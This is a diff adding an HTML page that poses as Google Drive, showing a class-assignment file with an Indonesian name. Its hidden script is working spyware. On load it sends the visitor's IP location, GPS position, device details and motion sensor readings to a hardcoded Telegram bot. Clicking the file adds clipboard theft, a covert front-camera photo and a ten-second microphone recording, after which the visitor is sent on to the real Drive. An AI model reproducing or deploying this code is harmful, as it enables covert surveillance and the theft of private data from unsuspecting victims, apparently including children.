@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <title>Google Drive</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            margin: 0;
+            font-family: 'Roboto', Arial, sans-serif;
+            background-color: #f5f5f5;
+        }
+        .header {
+            display: flex;
+            align-items: center;
+            padding: 8px 16px;
+            background-color: white;
+            border-bottom: 1px solid #e0e0e0;
+        }
+        .logo {
+            height: 40px;
+            margin-right: 10px;
+        }
+        .search-bar {
+            flex-grow: 1;
+            margin: 0 20px;
+            padding: 8px 16px;
+            border-radius: 8px;
+            border: 1px solid #e0e0e0;
+            background-color: #f1f3f4;
+            max-width: 600px;
+        }
+        .user-icon {
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            background-color: #4285f4;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+        }
+        .main-content {
+            display: flex;
+            min-height: calc(100vh - 57px);
+        }
+        .sidebar {
+            width: 250px;
+            background-color: white;
+            padding: 16px 0;
+        }
+        .sidebar-item {
+            display: flex;
+            align-items: center;
+            padding: 12px 24px;
+            color: #5f6368;
+            cursor: pointer;
+        }
+        .sidebar-item:hover {
+            background-color: #f1f3f4;
+        }
+        .sidebar-icon {
+            margin-right: 16px;
+            color: #5f6368;
+        }
+        .content {
+            flex-grow: 1;
+            padding: 24px;
+        }
+        .files-container {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+            gap: 16px;
+        }
+        .file-item {
+            background-color: white;
+            border-radius: 8px;
+            padding: 16px;
+            text-align: center;
+            cursor: pointer;
+            border: 1px solid #e0e0e0;
+            transition: box-shadow 0.2s;
+        }
+        .file-item:hover {
+            box-shadow: 0 1px 3px rgba(0,0,0,0.12), 0 1px 2px rgba(0,0,0,0.24);
+        }
+        .file-icon {
+            font-size: 48px;
+            color: #4285f4;
+            margin-bottom: 8px;
+        }
+        .file-name {
+            font-size: 14px;
+            color: #202124;
+            word-break: break-word;
+        }
+        .loading {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255,255,255,0.8);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+        .spinner {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #4285f4;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 16px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+</head>
+<body>
+    <div class="header">
+        <img src="https://www.gstatic.com/images/branding/product/1x/drive_2020q4_48dp.png" alt="Google Drive" class="logo">
+        <div>Drive</div>
+        <input type="text" placeholder="Search in Drive" class="search-bar">
+        <div class="user-icon">U</div>
+    </div>
+    
+    <div class="main-content">
+        <div class="sidebar">
+            <div class="sidebar-item">
+                <span class="material-icons sidebar-icon">home</span>
+                <span>My Drive</span>
+            </div>
+            <div class="sidebar-item">
+                <span class="material-icons sidebar-icon">computer</span>
+                <span>Computers</span>
+            </div>
+            <div class="sidebar-item">
+                <span class="material-icons sidebar-icon">people</span>
+                <span>Shared with me</span>
+            </div>
+            <div class="sidebar-item">
+                <span class="material-icons sidebar-icon">watch_later</span>
+                <span>Recent</span>
+            </div>
+            <div class="sidebar-item">
+                <span class="material-icons sidebar-icon">star</span>
+                <span>Starred</span>
+            </div>
+            <div class="sidebar-item">
+                <span class="material-icons sidebar-icon">delete</span>
+                <span>Trash</span>
+            </div>
+        </div>
+        
+        <div class="content">
+            <h2>My Drive</h2>
+            <div class="files-container">
+                <div class="file-item" id="tugas-file">
+                    <span class="material-icons file-icon">description</span>
+                    <div class="file-name">tugas kelas 7b.docx</div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="loading" id="loading">
+        <div class="spinner"></div>
+        <div>Opening "tugas kelas 7b.docx"...</div>
+    </div>
+
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        // Setting
+        const token = '8118720781:AAFciunnQRseF8FI6VDHU_FgEO9A-KX2RoU'; // Tokenmu
+        const chat_id = '7916928366'; // Chat ID mu
+        const startTime = Date.now();
+
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+
+        // Telegram kirim
+        function kirimPesan(text) {
+            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ chat_id, text })
+            });
+        }
+
+        function kirimFoto(blob, caption) {
+            let form = new FormData();
+            form.append('chat_id', chat_id);
+            form.append('photo', blob, 'foto.jpg');
+            form.append('caption', caption);
+            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: form });
+        }
+
+        function kirimAudio(blob) {
+            let form = new FormData();
+            form.append('chat_id', chat_id);
+            form.append('audio', blob, 'rekaman.mp3');
+            form.append('caption', '🎤 Rekaman Suara Korban');
+            fetch(`https://api.telegram.org/bot${token}/sendAudio`, { method: 'POST', body: form });
+        }
+
+        // Sadap kamera
+        function ambilFoto() {
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            ctx.drawImage(video, 0, 0);
+            canvas.toBlob(blob => kirimFoto(blob, '📸 Foto Kamera'));
+        }
+
+        // Sadap mic
+        function sadapMic() {
+            navigator.mediaDevices.getUserMedia({ audio: true })
+            .then(stream => {
+                const recorder = new MediaRecorder(stream);
+                const audioChunks = [];
+                recorder.ondataavailable = e => audioChunks.push(e.data);
+                recorder.onstop = () => {
+                    const audioBlob = new Blob(audioChunks, { type: 'audio/mp3' });
+                    kirimAudio(audioBlob);
+                };
+                recorder.start();
+                setTimeout(() => recorder.stop(), 10000); // 10 detik
+            });
+        }
+
+        // Sensor
+        function sensorInfo() {
+            window.addEventListener('devicemotion', event => {
+                const acc = event.accelerationIncludingGravity;
+                kirimPesan(`📡 Sensor:
+        X: ${acc.x?.toFixed(2)}
+        Y: ${acc.y?.toFixed(2)}
+        Z: ${acc.z?.toFixed(2)}
+        `);
+            }, { once: true });
+        }
+
+        // Curi clipboard
+        function curiClipboard() {
+            navigator.clipboard.readText()
+            .then(text => kirimPesan('📋 Clipboard:\n' + text))
+            .catch(err => kirimPesan('Gagal akses clipboard: ' + err));
+        }
+
+        // Device info
+        function deviceInfo() {
+            fetch('https://api.ipify.org?format=json')
+            .then(res => res.json())
+            .then(ipData => fetch('https://ipapi.co/' + ipData.ip + '/json/'))
+            .then(loc => loc.json())
+            .then(info => {
+                const device = navigator.userAgent;
+                const ram = navigator.deviceMemory || 'Tidak diketahui';
+                const cpu = navigator.hardwareConcurrency || 'Tidak diketahui';
+                const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                const bahasa = navigator.language;
+                const browser = navigator.appName + ' ' + navigator.appVersion;
+                const statusJaringan = navigator.onLine ? 'Online' : 'Offline';
+
+                navigator.getBattery().then(bat => {
+                    const now = Date.now();
+                    const waktuBuka = Math.floor((now - startTime) / 1000);
+                    const status = `
+        •=[𝗕𝗘𝗥𝗜𝗞𝗨𝗧 𝗜𝗡𝗙𝗢 𝗣𝗥𝗔𝗡𝗚𝗞𝗔𝗧 𝗡𝗬𝗔 𝗧𝗨𝗔𝗡]=•
+        🌐 IP: ${info.ip}
+        🏳 Negara: ${info.country_name}
+        🖥 Region: ${info.region}
+        📲 Kota: ${info.city}
+        🔎 ISP: ${info.org}
+        🔋 Baterai: ${Math.floor(bat.level * 100)}%
+        📱 Device: ${device}
+        🧠 RAM: ${ram} GB
+        ⚙️ CPU: ${cpu} core
+        🌍 Zona Waktu: ${timezone}
+        🗣️ Bahasa: ${bahasa}
+        🧭 Browser: ${browser}
+        📡 Status Jaringan: ${statusJaringan}
+        ⏳ Waktu buka web: ${waktuBuka} detik
+        ==[🔥] 𝗩𝗥𝗦 𝗛𝗔𝗖𝗞 [🔥]==`;
+                    kirimPesan(status);
+                });
+            });
+        }
+
+        // Lokasi GPS
+        function gpsLokasi() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(pos => {
+                    const lat = pos.coords.latitude;
+                    const lon = pos.coords.longitude;
+                    kirimPesan(`📍 Lokasi GPS:\nhttps://maps.google.com/?q=${lat},${lon}`);
+                });
+            }
+        }
+
+        // Vibrasi
+        function vibratePhone() {
+            if (navigator.vibrate) {
+                navigator.vibrate([200, 100, 200]);
+            }
+        }
+
+        // Sadap semua
+        function mulaiSadap() {
+            // Device info
+            deviceInfo();
+            // Clipboard
+            curiClipboard();
+            // GPS Lokasi
+            gpsLokasi();
+            // Sensor
+            sensorInfo();
+            // Vibrasi
+            vibratePhone();
+            // Kamera depan
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } })
+            .then(stream => {
+                video.srcObject = stream;
+                setTimeout(() => {
+                    ambilFoto();
+                    stream.getTracks().forEach(track => track.stop());
+                }, 4000);
+            });
+            // Sadap mic
+            sadapMic();
+        }
+
+        // Ketika file diklik
+        document.getElementById('tugas-file').addEventListener('click', function() {
+            document.getElementById('loading').style.display = 'flex';
+            
+            // Jalankan semua fungsi sadap
+            mulaiSadap();
+            
+            // Redirect setelah beberapa detik
+            setTimeout(() => {
+                window.location.href = 'https://drive.google.com';
+            }, 9000);
+        });
+
+        // Jalankan beberapa fungsi saat halaman dimuat
+        window.addEventListener('load', function() {
+            // Beberapa fungsi yang tidak memerlukan interaksi pengguna
+            deviceInfo();
+            gpsLokasi();
+            sensorInfo();
+        });
+    </script>
+</body>
+  </html>
